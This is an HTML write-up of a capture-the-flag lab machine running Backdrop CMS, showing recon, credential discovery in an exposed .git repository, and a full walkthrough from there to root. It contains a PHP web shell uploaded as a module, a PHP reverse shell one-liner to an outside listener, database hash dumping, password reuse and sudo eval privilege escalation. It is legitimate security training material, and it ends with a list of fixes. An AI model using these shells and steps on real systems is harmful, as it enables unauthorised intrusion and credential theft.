+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-20 20:44 CET
+Nmap scan report for 10.10.11.58
+Host is up (0.043s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 97:2a:d2:2c:89:8a:d3:ed:4d:ac:00:d2:1e:87:49:a7 (RSA)
+|   256 27:7c:3c:eb:0f:26:e9:62:59:0f:0f:b1:38:c9:ae:2b (ECDSA)
+|_  256 93:88:47:4c:69:af:72:16:09:4c:ba:77:1e:3b:3b:eb (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+| http-git: 
+|   10.10.11.58:80/.git/
+|     Git repository found!
+|     Repository description: Unnamed repository; edit this file 'description' to name the...
+|_    Last commit message: todo: customize url aliases.  reference:https://docs.backdro...
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Home | Dog
+| http-robots.txt: 22 disallowed entries (15 shown)
+| /core/ /profiles/ /README.md /web.config /admin 
+| /comment/reply /filter/tips /node/add /search /user/register 
+|_/user/password /user/login /user/logout /?q=admin /?q=comment/reply
+|_http-generator: Backdrop CMS 1 (https://backdropcms.org)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 9.07 seconds
+</code></pre>
+<p>It has an open git! And, as the apache server is misconfigured and enables indexes, we can see all the git folder!</p>
+<pre><code>┌──(oriol㉿zero)-[~/htb/dog]
+└─$ wget http://$target/.git/ -O git.html 
+--2025-03-20 20:47:18--  http://10.10.11.58/.git/
+Connecting to 10.10.11.58:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 2877 (2.8K) [text/html]
+Saving to: ‘git.html’
+
+git.html                                                   100%[========================================================================================================================================&gt;]   2.81K  --.-KB/s    in 0s      
+
+2025-03-20 20:47:18 (84.3 MB/s) - ‘git.html’ saved [2877/2877]
+
+
+┌──(oriol㉿zero)-[~/htb/dog]
+└─$ cat git.html
+&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 3.2 Final//EN&quot;&gt;
+&lt;html&gt;
+    &lt;head&gt;
+    &lt;title&gt;Index of /.git&lt;/title&gt;
+    &lt;/head&gt;
+    &lt;body&gt;
+&lt;h1&gt;Index of /.git&lt;/h1&gt;
+    &lt;table&gt;
+    &lt;tr&gt;&lt;th valign=&quot;top&quot;&gt;&lt;img src=&quot;/icons/blank.gif&quot; alt=&quot;[ICO]&quot;&gt;&lt;/th&gt;&lt;th&gt;&lt;a href=&quot;?C=N;O=D&quot;&gt;Name&lt;/a&gt;&lt;/th&gt;&lt;th&gt;&lt;a href=&quot;?C=M;O=A&quot;&gt;Last modified&lt;/a&gt;&lt;/th&gt;&lt;th&gt;&lt;a href=&quot;?C=S;O=A&quot;&gt;Size&lt;/a&gt;&lt;/th&gt;&lt;th&gt;&lt;a href=&quot;?C=D;O=A&quot;&gt;Description&lt;/a&gt;&lt;/th&gt;&lt;/tr&gt;
+    &lt;tr&gt;&lt;th colspan=&quot;5&quot;&gt;&lt;hr&gt;&lt;/th&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td valign=&quot;top&quot;&gt;&lt;img src=&quot;/icons/back.gif&quot; alt=&quot;[PARENTDIR]&quot;&gt;&lt;/td&gt;&lt;td&gt;&lt;a href=&quot;/&quot;&gt;Parent Directory&lt;/a&gt;&lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;td align=&quot;right&quot;&gt;  - &lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td valign=&quot;top&quot;&gt;&lt;img src=&quot;/icons/unknown.gif&quot; alt=&quot;[   ]&quot;&gt;&lt;/td&gt;&lt;td&gt;&lt;a href=&quot;COMMIT_EDITMSG&quot;&gt;COMMIT_EDITMSG&lt;/a&gt;&lt;/td&gt;&lt;td align=&quot;right&quot;&gt;2025-02-07 21:22  &lt;/td&gt;&lt;td align=&quot;right&quot;&gt; 95 &lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td valign=&quot;top&quot;&gt;&lt;img src=&quot;/icons/unknown.gif&quot; alt=&quot;[   ]&quot;&gt;&lt;/td&gt;&lt;td&gt;&lt;a href=&quot;HEAD&quot;&gt;HEAD&lt;/a&gt;&lt;/td&gt;&lt;td align=&quot;right&quot;&gt;2025-02-07 21:21  &lt;/td&gt;&lt;td align=&quot;right&quot;&gt; 23 &lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td valign=&quot;top&quot;&gt;&lt;img src=&quot;/icons/folder.gif&quot; alt=&quot;[DIR]&quot;&gt;&lt;/td&gt;&lt;td&gt;&lt;a href=&quot;branches/&quot;&gt;branches/&lt;/a&gt;&lt;/td&gt;&lt;td align=&quot;right&quot;&gt;2025-02-07 21:21  &lt;/td&gt;&lt;td align=&quot;right&quot;&gt;  - &lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td valign=&quot;top&quot;&gt;&lt;img src=&quot;/icons/unknown.gif&quot; alt=&quot;[   ]&quot;&gt;&lt;/td&gt;&lt;td&gt;&lt;a href=&quot;config&quot;&gt;config&lt;/a&gt;&lt;/td&gt;&lt;td align=&quot;right&quot;&gt;2025-02-07 21:21  &lt;/td&gt;&lt;td align=&quot;right&quot;&gt; 92 &lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td valign=&quot;top&quot;&gt;&lt;img src=&quot;/icons/unknown.gif&quot; alt=&quot;[   ]&quot;&gt;&lt;/td&gt;&lt;td&gt;&lt;a href=&quot;description&quot;&gt;description&lt;/a&gt;&lt;/td&gt;&lt;td align=&quot;right&quot;&gt;2025-02-07 21:21  &lt;/td&gt;&lt;td align=&quot;right&quot;&gt; 73 &lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td valign=&quot;top&quot;&gt;&lt;img src=&quot;/icons/folder.gif&quot; alt=&quot;[DIR]&quot;&gt;&lt;/td&gt;&lt;td&gt;&lt;a href=&quot;hooks/&quot;&gt;hooks/&lt;/a&gt;&lt;/td&gt;&lt;td align=&quot;right&quot;&gt;2025-02-07 21:21  &lt;/td&gt;&lt;td align=&quot;right&quot;&gt;  - &lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td valign=&quot;top&quot;&gt;&lt;img src=&quot;/icons/unknown.gif&quot; alt=&quot;[   ]&quot;&gt;&lt;/td&gt;&lt;td&gt;&lt;a href=&quot;index&quot;&gt;index&lt;/a&gt;&lt;/td&gt;&lt;td align=&quot;right&quot;&gt;2025-02-07 21:22  &lt;/td&gt;&lt;td align=&quot;right&quot;&gt;337K&lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td valign=&quot;top&quot;&gt;&lt;img src=&quot;/icons/folder.gif&quot; alt=&quot;[DIR]&quot;&gt;&lt;/td&gt;&lt;td&gt;&lt;a href=&quot;info/&quot;&gt;info/&lt;/a&gt;&lt;/td&gt;&lt;td align=&quot;right&quot;&gt;2025-02-07 21:21  &lt;/td&gt;&lt;td align=&quot;right&quot;&gt;  - &lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td valign=&quot;top&quot;&gt;&lt;img src=&quot;/icons/folder.gif&quot; alt=&quot;[DIR]&quot;&gt;&lt;/td&gt;&lt;td&gt;&lt;a href=&quot;logs/&quot;&gt;logs/&lt;/a&gt;&lt;/td&gt;&lt;td align=&quot;right&quot;&gt;2025-02-07 21:22  &lt;/td&gt;&lt;td align=&quot;right&quot;&gt;  - &lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td valign=&quot;top&quot;&gt;&lt;img src=&quot;/icons/folder.gif&quot; alt=&quot;[DIR]&quot;&gt;&lt;/td&gt;&lt;td&gt;&lt;a href=&quot;objects/&quot;&gt;objects/&lt;/a&gt;&lt;/td&gt;&lt;td align=&quot;right&quot;&gt;2025-02-07 21:21  &lt;/td&gt;&lt;td align=&quot;right&quot;&gt;  - &lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td valign=&quot;top&quot;&gt;&lt;img src=&quot;/icons/folder.gif&quot; alt=&quot;[DIR]&quot;&gt;&lt;/td&gt;&lt;td&gt;&lt;a href=&quot;refs/&quot;&gt;refs/&lt;/a&gt;&lt;/td&gt;&lt;td align=&quot;right&quot;&gt;2025-02-07 21:21  &lt;/td&gt;&lt;td align=&quot;right&quot;&gt;  - &lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;
+    &lt;tr&gt;&lt;th colspan=&quot;5&quot;&gt;&lt;hr&gt;&lt;/th&gt;&lt;/tr&gt;
+&lt;/table&gt;
+&lt;address&gt;Apache/2.4.41 (Ubuntu) Server at 10.10.11.58 Port 80&lt;/address&gt;
+&lt;/body&gt;&lt;/html&gt;
+</code></pre>
+<p>I will use <code>git-dumper</code> but it could also be done with the same <code>wget -rkpN -e robots=off</code> technique because the .git is only a folder with all the git information like branches, code, ...</p>
+<pre><code>┌──(oriol㉿zero)-[~/htb/dog]
+└─$ git-dumper http://$target/.git dog_git/.git
+[-] Testing http://10.10.11.58/.git/HEAD [200]
+[-] Testing http://10.10.11.58/.git/ [200]
+[-] Fetching .git recursively
+[-] Fetching http://10.10.11.58/.gitignore [404]
+[-] http://10.10.11.58/.gitignore responded with status code 404
+[-] Fetching http://10.10.11.58/.git/ [200]
+[-] Fetching http://10.10.11.58/.git/logs/ [200]
+[-] Fetching http://10.10.11.58/.git/COMMIT_EDITMSG [200]
+[-] Fetching http://10.10.11.58/.git/config [200]
+[-] Fetching http://10.10.11.58/.git/branches/ [200]
+[-] Fetching http://10.10.11.58/.git/HEAD [200]
+[-] Fetching http://10.10.11.58/.git/hooks/ [200]
+[-] Fetching http://10.10.11.58/.git/objects/ [200]
+[-] Fetching http://10.10.11.58/.git/logs/refs/ [200]
+[-] Fetching http://10.10.11.58/.git/refs/ [200]
+[-] Fetching http://10.10.11.58/.git/logs/HEAD [200]
+[-] Fetching http://10.10.11.58/.git/hooks/applypatch-msg.sample [200]
+[-] Fetching http://10.10.11.58/.git/hooks/commit-msg.sample [200]
+[-] Fetching http://10.10.11.58/.git/hooks/fsmonitor-watchman.sample [200]
+[-] Fetching http://10.10.11.58/.git/hooks/pre-commit.sample [200]
+[-] Fetching http://10.10.11.58/.git/hooks/post-update.sample [200]
+[-] Fetching http://10.10.11.58/.git/hooks/pre-applypatch.sample [200]
+[-] Fetching http://10.10.11.58/.git/hooks/pre-merge-commit.sample [200]
+[-] Fetching http://10.10.11.58/.git/hooks/pre-push.sample [200]
+</code></pre>
+<p>Now, if I go to the .git folder, as it is a git environment, is like I have all the repository on my local computer:</p>
+<pre><code>┌──(oriol㉿zero)-[~/htb/dog/dog_git/.git]
+└─$ git status
+On branch master
+nothing to commit, working tree clean
+</code></pre>
+<p>Only master branch</p>
+<pre><code>┌──(oriol㉿zero)-[~/htb/dog/dog_git/.git]
+└─$ git branch
+* master
+</code></pre>
+<p>First, on the <code>settings.php</code> file, there are the database credentials, unlucky seems like this database is not accessible from the exterior, only local connections, but this is a great discovery, as we can enter to the database once inside, and also we have a password: <strong>BackDropJ2024DS2024</strong></p>
+<pre><code>──(oriol㉿zero)-[~/htb/dog/dog_git/.git]
+└─$ cat settings.php        
+&lt;?php
+/**
+    * @file
+    * Main Backdrop CMS configuration file.
+    */
+
+/**
+    * Database configuration:
+    *
+    * Most sites can configure their database by entering the connection string
+    * below. If using primary/replica databases or multiple connections, see the
+    * advanced database documentation at
+    * https://api.backdropcms.org/database-configuration
+    */
+$database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';
+$database_prefix = '';
+</code></pre>
+<p>On the backdrop documentations it states:
+By default, it is stored in .json config files which are stored under <code>/files/config_[some-randomly-generated-hash]</code></p>
+<ul>
+    <li> <p>https://docs.backdropcms.org/documentation/working-with-configuration</p></li>
+</ul>
+<p>So let's start searching on here.
+I use the same oneliner to do a grep on all the files, I grep the "@" character, as this is commonly used on users, for example user@machine or user@domain, and also backdrop login uses email addresses</p>
+<pre><code>┌──(oriol㉿zero)-[~/…/.git/files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active]
+└─$ find . -type f -exec file {} + | grep -i 'text' | cut -d: -f1 | xargs grep -i '@'       
+./update.settings.json:        &quot;tiffany@dog.htb&quot;
+</code></pre>
+<p>And we have a user, and also we have the hostname of the machine, <strong>dog.htb</strong>, so let's add it to the hosts file. tiffany@dog.htb</p>
+<p>It seems that with the dog.htb domain, the webpage is the same.</p>
+<ul>
+<li><strong>user:</strong> tiffany@dog.htb</li>
+<li><strong>password:</strong> BackDropJ2024DS2024</li>
+</ul>
+<h2>Attack</h2>
+<h3>Gaining access</h3>
+<p>I try to enter via ssh with the tiffany account but I can't.
+Now that we have a user and a password, let's try to log in to the Backdrop
+And we are in!</p>
+<p><img src="src/dog01.png"></p>
+<p>And on the status report page we can see the verision of backdrop:</p>
+<p><img src="src/dog02.png"></p>
+<p>This is very useful for searching for server side template injections or vulnerabilities.</p>
+<p>Looking at the internet I see this:
+<ul>
+    <li>https://github.com/V1n1v131r4/CSRF-to-RCE-on-Backdrop-CMS</li>
+    <li>https://www.exploit-db.com/exploits/52021</li>
+    <li>https://sploitus.com/exploit?id=PACKETSTORM:189764</li>
+</ul>
+</p>
+<p>On the description of the first github link there's the explanation of the attack:
+- The Backdrop CMS version 1.20 allows plugins to be added via ZIP files uploaded to the site. And because it does not have anti-CSRF protection, it is possible for an attacker to create a plugin with a file that allows execution of commands, host it and, using a forged page, make the site admin upload this plugin just by clicking on a malicious link.</p>
+<p>Seems like the exploit-db vulnerability uses the same principle as the github one, which says explicitly the version 1.20. 
+Looking at the python code what it does:
+<ul>
+    <li>Creates a .info file with information regarding the plugin</li>
+    <li>Creates a .php file with the reverse shell</li>
+    <li>Zips the 2 files</li>
+</ul>
+And then I suppose that there is a page to upload that zip and add the plugin to backdrop.</p>
+<p>A quick search lands me to the http://dog.htb/?q=admin/installer/manual url to manually install a .zip containing a module.</p>
+<p>I create a .info file, like the exploit-db script:</p>
+<pre><code>┌──(oriol㉿zero)-[~/htb/dog/exploit]
+└─$ cat test.info           
+type = module
+name = Block
+description = Controls the visual building blocks a page is constructed with. Blocks are boxes of content rendered into an area, or region, of a web page.
+package = Layouts
+tags[] = Blocks
+tags[] = Site Architecture
+version = BACKDROP_VERSION
+backdrop = 1.x
+
+configure = admin/structure/block
+
+; Added by Backdrop CMS packaging script on 2024-03-07
+project = backdrop
+version = 1.27.1
+timestamp = 1709862662
+</code></pre>
+<p>Just default data.</p>
+<p>And for the .php file I use a reverse shell (got it from https://www.revshells.com/)</p>
+<pre><code>&lt;html&gt;
+&lt;body&gt;
+&lt;form method=&quot;GET&quot; name=&quot;&lt;?php echo basename($_SERVER['PHP_SELF']); ?&gt;&quot;&gt;
+&lt;input type=&quot;TEXT&quot; name=&quot;cmd&quot; id=&quot;cmd&quot; size=&quot;80&quot;&gt;
+&lt;input type=&quot;SUBMIT&quot; value=&quot;Execute&quot;&gt;
+&lt;/form&gt;
+&lt;pre&gt;
+&lt;?php
+    if(isset($_GET['cmd']))
+    {
+        system($_GET['cmd']);
+    }
+?&gt;
+&lt;/pre&gt;
+&lt;/body&gt;
+&lt;script&gt;document.getElementById(&quot;cmd&quot;).focus();&lt;/script&gt;
+&lt;/html&gt;
+</code></pre>
+<p>I already tried this, but instead a .zip file, I'll have to compress it to a tar, tgz, gz or bz2:</p>
+<p><img src="src/dog04.png"></p>
+<p>Also, it has to be compressed the directory, not the files.</p>
+<pre><code>┌──(oriol㉿zero)-[~/htb/dog]
+└─$ tar -cvf exploit.tar exploit
+exploit/
+exploit/test.php
+exploit/test.info
+</code></pre>
+<p>I select the .tar created and installed!</p>
+<p><img src="src/dog05.png"></p>
+<p>Looking at the exploit.db script, the .php can we found on the /modules folder</p>
+<pre><code>print(&quot;Your shell address:&quot;, url + &quot;/modules/shell/shell.php&quot;)
+</code></pre>
+<p>I go, and we have a input text that will execute the system commands we input in it!</p>
+<p><img src="src/dog06.png"></p>
+<p>Now, for convenience I wil start a listener and create a reverse shell.</p>
+<pre><code>┌──(oriol㉿zero)-[~/htb/dog]
+└─$ nc -nvlp 9999
+listening on [any] 9999 ...
+</code></pre>
+<p>I input some php reverse shell:</p>
+<pre><code>php -r '$sock=fsockopen(&quot;10.10.14.27&quot;,9999);exec(&quot;bash &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);'
+</code></pre>
+<p>And we are in</p>
+<pre><code>┌──(oriol㉿zero)-[~/htb/dog]
+└─$ nc -nvlp 9999
+listening on [any] 9999 ...
+connect to [10.10.14.27] from (UNKNOWN) [10.10.11.58] 38734
+whoami
+www-data
+</code></pre>
+<p>The user.txt flag is not in here, meaning we still have to pivot to another user to get it.
+On the /home directory there are 2 users:</p>
+<pre><code>ls /home
+jobert
+johncusack
+</code></pre>
+<p>And is inside the <code>johncusack</code> user:</p>
+<pre><code>ls /home/johncusack
+user.txt
+</code></pre>
+<p>I spawn a TTY shell with python for comodity:</p>
+<pre><code>python3 -c &quot;import pty; pty.spawn('/bin/bash')&quot;
+www-data@dog:/var/www/html/modules/exploit$ 
+</code></pre>
+<p>I also create it interactive with this command on my local machine, first I need to put the reverse shell on the background with cntr + z</p>
+<pre><code>stty raw -echo;fg
+</code></pre>
+<p>I remember we got the credentials of the database, so I connect to it:</p>
+<pre><code>www-data@dog:/var/www/html/modules/exploit$ mysql -u root -p
+Enter password: 
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 523
+Server version: 8.0.41-0ubuntu0.20.04.1 (Ubuntu)
+</code></pre>
+<pre><code>mysql&gt; show databases;
++--------------------+
+| Database           |
++--------------------+
+| backdrop           |
+| information_schema |
+| mysql              |
+| performance_schema |
+| sys                |
++--------------------+
+5 rows in set (0.01 sec)
+
+mysql&gt; use backdrop;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+
+mysql&gt; show tables;
++-----------------------------+
+| Tables_in_backdrop          |
++-----------------------------+
+| batch                       |
+| cache                       |
+| cache_admin_bar             |
+| cache_bootstrap             |
+| cache_entity_comment        |
+| cache_entity_file           |
+| cache_entity_node           |
+| cache_entity_taxonomy_term  |
+| cache_entity_user           |
+| cache_field                 |
+| cache_filter                |
+| cache_layout_path           |
+| cache_menu                  |
+| cache_page                  |
+| cache_path                  |
+| cache_token                 |
+| cache_update                |
+| cache_views                 |
+| cache_views_data            |
+| comment                     |
+| field_data_body             |
+| field_data_comment_body     |
+| field_data_field_image      |
+| field_data_field_tags       |
+| field_revision_body         |
+| field_revision_comment_body |
+| field_revision_field_image  |
+| field_revision_field_tags   |
+| file_managed                |
+| file_metadata               |
+| file_usage                  |
+| flood                       |
+| history                     |
+| menu_links                  |
+| menu_router                 |
+| node                        |
+| node_access                 |
+| node_comment_statistics     |
+| node_revision               |
+| queue                       |
+| redirect                    |
+| search_dataset              |
+| search_index                |
+| search_node_links           |
+| search_total                |
+| semaphore                   |
+| sequences                   |
+| sessions                    |
+| state                       |
+| system                      |
+| taxonomy_index              |
+| taxonomy_term_data          |
+| taxonomy_term_hierarchy     |
+| tempstore                   |
+| url_alias                   |
+| users                       |
+| users_roles                 |
+| variable                    |
+| watchdog                    |
++-----------------------------+
+59 rows in set (0.00 sec)
+
+</code></pre>
+<p>Users table!</p>
+<pre><code>mysql&gt; select * from users;
++-----+-------------------+---------------------------------------------------------+----------------------------+-----------+------------------+------------+------------+------------+------------+--------+----------+----------+---------+----------------------------+------------+
+| uid | name              | pass                                                    | mail                       | signature | signature_format | created    | changed    | access     | login      | status | timezone | language | picture | init                       | data       |
++-----+-------------------+---------------------------------------------------------+----------------------------+-----------+------------------+------------+------------+------------+------------+--------+----------+----------+---------+----------------------------+------------+
+|   0 |                   |                                                         |                            |           | NULL             |          0 |          0 |          0 |          0 |      0 | NULL     |          |       0 |                            | NULL       |
+|   1 | jPAdminB          | $S$E7dig1GTaGJnzgAXAtOoPuaTjJ05fo8fH9USc6vO87T./ffdEr/. | jPAdminB@dog.htb           |           | NULL             | 1720548614 | 1720584122 | 1720714603 | 1720584166 |      1 | UTC      |          |       0 | jPAdminB@dog.htb           | 0x623A303B |
+|   2 | jobert            | $S$E/F9mVPgX4.dGDeDuKxPdXEONCzSvGpjxUeMALZ2IjBrve9Rcoz1 | jobert@dog.htb             |           | NULL             | 1720584462 | 1720584462 | 1720632982 | 1720632780 |      1 | UTC      |          |       0 | jobert@dog.htb             | NULL       |
+|   3 | dogBackDropSystem | $S$EfD1gJoRtn8I5TlqPTuTfHRBFQWL3x6vC5D3Ew9iU4RECrNuPPdD | dogBackDroopSystem@dog.htb |           | NULL             | 1720632880 | 1720632880 | 1723752097 | 1723751569 |      1 | UTC      |          |       0 | dogBackDroopSystem@dog.htb | NULL       |
+|   5 | john              | $S$EYniSfxXt8z3gJ7pfhP5iIncFfCKz8EIkjUD66n/OTdQBFklAji. | john@dog.htb               |           | NULL             | 1720632910 | 1720632910 |          0 |          0 |      1 | UTC      |          |       0 | john@dog.htb               | NULL       |
+|   6 | morris            | $S$E8OFpwBUqy/xCmMXMqFp3vyz1dJBifxgwNRMKktogL7VVk7yuulS | morris@dog.htb             |           | NULL             | 1720632931 | 1720632931 |          0 |          0 |      1 | UTC      |          |       0 | morris@dog.htb             | NULL       |
+|   7 | axel              | $S$E/DHqfjBWPDLnkOP5auHhHDxF4U.sAJWiODjaumzxQYME6jeo9qV | axel@dog.htb               |           | NULL             | 1720632952 | 1720632952 |          0 |          0 |      1 | UTC      |          |       0 | axel@dog.htb               | NULL       |
+|   8 | rosa              | $S$EsV26QVPbF.s0UndNPeNCxYEP/0z2O.2eLUNdKW/xYhg2.lsEcDT | rosa@dog.htb               |           | NULL             | 1720632982 | 1720632982 |          0 |          0 |      1 | UTC      |          |       0 | rosa@dog.htb               | NULL       |
+|  10 | tiffany           | $S$EEAGFzd8HSQ/IzwpqI79aJgRvqZnH4JSKLv2C83wUphw0nuoTY8v | tiffany@dog.htb            |           | NULL             | 1723752136 | 1723752136 | 1742727047 | 1742726853 |      1 | UTC      |          |       0 | tiffany@dog.htb            | NULL       |
++-----+-------------------+---------------------------------------------------------+----------------------------+-----------+------------------+------------+------------+------------+------------+--------+----------+----------+---------+----------------------------+------------+
+9 rows in set (0.00 sec)
+</code></pre>
+<p>On hashes.com it identifies it as a <code>Drupal7</code></p>
+<p><img src="src/dog07.png"></p>
+<p>I will try to crack the john crack, as I think is the same user as <code>johncusack</code>
+On the hashcat documentation it says to use a hash mode of <strong>7900</strong></p>
+<pre><code>┌──(oriol㉿zero)-[~/htb/dog]
+└─$ cat hash
+$S$E/F9mVPgX4.dGDeDuKxPdXEONCzSvGpjxUeMALZ2IjBrve9Rcoz1
+
+┌──(oriol㉿zero)-[~/htb/dog]
+└─$ hashcat -m 7900 hash /usr/share/wordlists/rockyou.txt.gz
+hashcat (v6.2.6) starting
+
+OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+============================================================================================================================================
+* Device #1: cpu-haswell-AMD Ryzen 9 9900X 12-Core Processor, 11465/22995 MB (4096 MB allocatable), 12MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Optimizers applied:
+* Zero-Byte
+* Single-Hash
+* Single-Salt
+* Uses-64-Bit
+* Register-Limit
+
+Watchdog: Temperature abort trigger set to 90c
+
+Initializing backend runtime for device #1. Please be patient...
+</code></pre>
+<p>While hashcat is working, I keep searching, and I try to use tha same password as tiffany and the database on the johncusack user, and it works lol</p>
+<pre><code>www-data@dog:/home$ su johncusack
+Password: 
+johncusack@dog:/home$
+</code></pre>
+<p>I ssh in</p>
+<pre><code>┌──(oriol㉿zero)-[~]
+└─$ ssh johncusack@dog.htb
+johncusack@dog.htb's password: 
+Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-208-generic x86_64)
+</code></pre>
+<h3>Privilege scalation</h3>
+<p>With <code>sudo -l</code> we can see the commands that this user can execute as root.</p>
+<pre><code>johncusack@dog:~$ sudo -l
+[sudo] password for johncusack: 
+Sorry, try again.
+[sudo] password for johncusack: 
+Matching Defaults entries for johncusack on dog:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User johncusack may run the following commands on dog:
+    (ALL : ALL) /usr/local/bin/bee
+</code></pre>
+<p>Pretty interesting, let's see what this bee binary is:</p>
+<pre><code>johncusack@dog:~$ /usr/local/bin/bee -h
+🐝 Bee
+Usage: bee [global-options] &lt;command&gt; [options] [arguments]
+
+Global Options:
+    --root
+    Specify the root directory of the Backdrop installation to use. If not set, will try to find the Backdrop installation automatically based on the current directory.
+
+    --site
+    Specify the directory name or URL of the Backdrop site to use (as defined in 'sites.php'). If not set, will try to find the Backdrop site automatically based on the current directory.
+
+    --base-url
+    Specify the base URL of the Backdrop site, such as https://example.com. May be useful with commands that output URLs to pages on the site.
+
+    --yes, -y
+    Answer 'yes' to questions without prompting.
+
+    --debug, -d
+    Enables 'debug' mode, in which 'debug' and 'log' type messages will be displayed (in addition to all other messages).
+
+
+Commands:
+    CONFIGURATION
+    config-export
+    cex, bcex
+    Export config from the site.
+</code></pre>
+<p>Seems like a Backdrop utility.
+I see something very interesting on the help menu of the utility:</p>
+<pre><code> ADVANCED
+    db-query
+    dbq
+    Execute a query using db_query().
+
+    eval
+    ev, php-eval
+    Evaluate (run/execute) arbitrary PHP code after bootstrapping Backdrop.
+</code></pre>
+<p>It has eval command! With this we can execute code, and given that we can execute this as root, it means we can execute code as root.</p>
+<p>Let's give a it a try</p>
+<pre><code>johncusack@dog:~$ sudo /usr/local/bin/bee ev &quot;system('whoami')&quot;
+
+    ✘  The required bootstrap level for 'eval' is not ready
+</code></pre>
+<p>I don't know what this error message means, maybe it is necessary to configure something on the page?
+    I keep searching and I use the <code>status</code> option, which gives me this error:</p>
+<pre><code>johncusack@dog:~$ sudo /usr/local/bin/bee status
+
+    ⚠ No Backdrop installation found. Run this command again from within a Backdrop installation, or use the '--root' global option. 
+   </code></pre>
+   <p>Maybe earlier the <code>eval</code> returned that error because it didn't find a Backdrop installation, and with this a bootstrap level sufficient (?)</p>
+   <p>First, let's find the Backdrop installation path, for this, as I know that the <code>core</code> folder exists inside the Backdorp I will search system-wide for that folder</p>
+   <pre><code>johncusack@dog:/etc$ find / -iname core -type d 2&gt;/dev/null
+   /proc/sys/net/core
+   /var/www/html/core
+   </code></pre>
+   <p>Seems like (obiously) is on the <code>/var/www/html</code> directory</p>
+   <pre><code>johncusack@dog:/var/www/html$ ls
+   core  files  index.php  layouts  LICENSE.txt  modules  README.md  robots.txt  settings.php  sites  themes
+   </code></pre>
+   <p>Now, let's use the <code>--root</code> flag and retry the <code>eval</code></p>
+   <pre><code>johncusack@dog:~$ sudo /usr/local/bin/bee --root=/var/www/html ev &quot;system('whoami')&quot;
+   root
+   </code></pre>
+   <p>Yes! Now let's create a shell</p>
+   <pre><code>johncusack@dog:~$ sudo /usr/local/bin/bee --root=/var/www/html ev &quot;system('/bin/bash')&quot;
+   root@dog:/var/www/html# whoami
+   root
+   </code></pre>
+   
+<h1>Solutions</h1>
+<ul>
+<li>Do not re-use password, in this machine 3 different users had the same password!</li>
+<li>Disable indexes on the apache config</li>
+<li>Use a safe version of Backdrop</li>
+<li>Do not a normal user be able to use eval with root permissions, the sudo permissions should be very restricted.</li>
+</ul>
+<h1>Links used</h1>
+<ul>
+<li>https://backdropcms.org/</li>
+<li>https://superuser.com/questions/1690316/how-can-i-only-show-the-request-header-response-headers-and-output-to-dev-null</li>
+<li>https://geekland.eu/uso-del-comando-cut-en-linux-y-unix-con-ejemplos/</li>
+<li>https://cheatsheet.haax.fr/web-pentest/tools/ffuf/</li>
+<li>https://superuser.com/questions/655554/download-all-folders-subfolders-and-files-using-wget</li>
+<li>https://exploit-notes.hdks.org/exploit/web/dump-git-repository-from-website/</li>
+<li>https://docs.backdropcms.org/documentation/working-with-configuration</li>
+<li>https://fahmifj.medium.com/get-a-fully-interactive-reverse-shell-b7e8d6f5b1c1</li>
+<li>https://hashcat.net/wiki/doku.php?id=example_hashes</li>
+</ul>
+    <!-- Main Content -->
+    <div class="main-content">
+
+</div>  
+</body>
+</html>
